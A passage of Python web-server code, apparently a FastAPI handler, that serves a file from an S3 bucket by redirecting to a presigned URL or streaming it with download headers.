        if settings.S3_DOWNLOAD == "presign":
            url = await asyncio.to_thread(s3.presigned_url, key, name,
                                          bucket)
            return RedirectResponse(url, status_code=307)
        chunks = await asyncio.to_thread(s3.open_stream, key, bucket)
    except s3.S3Unavailable as exc:
        raise HTTPException(status_code=503,
                            detail=f"the S3 bucket: {exc}") from None
    headers = {"Content-Disposition": s3.content_disposition(name)}
    if head.get("ContentLength") is not None:
        headers["Content-Length"] = str(head["ContentLength"])
    return StreamingResponse(chunks, media_type="application/octet-stream",
                             headers=headers)
